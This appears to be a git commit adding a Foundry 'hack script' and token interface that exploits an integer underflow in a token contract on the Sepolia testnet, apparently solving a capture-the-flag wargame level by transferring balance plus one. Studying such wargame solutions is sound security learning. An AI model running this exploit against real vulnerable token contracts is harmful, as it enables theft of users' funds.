387a4a377383086a3515c2c1ea6643160dfee061
parizval <anmolgoyal@gmail.com>
2025-04-21 17:00:55 +0530

    added token code and hack script

---
+++ script/Token.s.sol
@@ -0,0 +1,37 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import {Script, console} from "forge-std/Script.sol";
+import {Token} from "../src/Token.sol";
+
+contract TokenScript is Script {
+    function setUp() public {}
+
+    function run() public {
+        hackContract();
+    }
+
+    function hackContract() internal {
+        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));
+
+        address TokenAddress = 0xC2939F68AC2bC7b4874506a93ef70728a38F9B58;
+        vm.selectFork(sepolia);
+
+        vm.startBroadcast();
+
+        console.log("Starting Hacking");
+
+        uint initial_balance = Token(TokenAddress).balanceOf(0xA01f6403d49857b58D3794C12E028c3681b24F98);
+
+        console.log('Initial Balance', initial_balance);
+
+        Token(TokenAddress).transfer(TokenAddress, initial_balance+1); 
+        
+        uint final_balance = Token(TokenAddress).balanceOf(0xA01f6403d49857b58D3794C12E028c3681b24F98);
+
+        console.log('Final Balance', final_balance);
+
+
+        vm.stopBroadcast();
+    }
+}
---
+++ src/Token.sol
@@ -0,0 +1,9 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Token {
+
+    function transfer(address _to, uint256 _value) external returns (bool); 
+
+    function balanceOf(address _owner) external view returns (uint256 balance);
+}
